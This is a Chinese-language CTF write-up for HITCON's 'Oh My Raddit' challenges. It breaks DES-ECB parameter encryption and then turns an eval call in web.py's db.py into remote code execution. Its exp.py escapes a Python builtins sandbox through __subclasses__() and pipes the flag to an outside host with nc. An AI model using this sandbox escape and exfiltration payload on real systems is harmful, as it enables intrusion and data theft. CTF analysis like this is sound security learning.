# Oh My Raddit v1 & v2

## v1

打開題目會發現有三種地方會帶有參數`s`:

1. 文章連結
2. 下載連結
3. 顯示文章數


然後仔細觀察下載連結，可以發現:

1. 結尾都是`3ca92540eb2d0a42` (8 bytes)

2. 開頭都是`2e7e305f2da018a2cf8208fa1fefc238` (16 bytes)

並且還發現似乎標題愈長，s就愈長

然後文章數也可以發現:

1. total 10: `06e77f2958b65ffd3ca92540eb2d0a42`

2. total 100: `06e77f2958b65ffd2c0f7629b9e19627`

只有後8 bytes不同

一臉ECB mode樣，且block size很明顯是8

然後從frequency可以發現`3ca92540eb2d0a42`出現次數非常高

可以猜測他就是padding

然後隊友就爆DES，爆出來key惹: `megnnaro`

## v2

從前面的key可以知道

他是用`web.py`

參數`m`為`r`代表設定文章數，為`d`代表下載，為`p`代表文章連結處理

我們可以透過`d`參數去下載檔案，包含`app.py`

很明顯從code可以看到SQL Injection

但似乎無法RCE

跟進去web.py，可以看到`db.py`裡面`reparam()`會去`v = eval(chunk, dictionary)`

只要輸入`m=p&l=${command}`就會從limit走到eval那邊

接著只剩下繞過`dictionary['__builtins__'] = object()`了


exp.py:

```python
# coding: UTF-8
import os
import urllib
import urlparse
import requests
from Crypto.Cipher import DES


ENCRPYTION_KEY = 'megnnaro'

def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length

    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')


tmp = {
    'm': 'p', 
    'l': "${[].__class__.__base__.__subclasses__()[-68]('/read_flag | nc kaibro.tw 6666',shell=1)}"
}

print(encrypt(urllib.urlencode(tmp)))

r = requests.get("http://13.115.255.46/?s="+encrypt(urllib.urlencode(tmp)))

print(r.text)

```

`hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}`
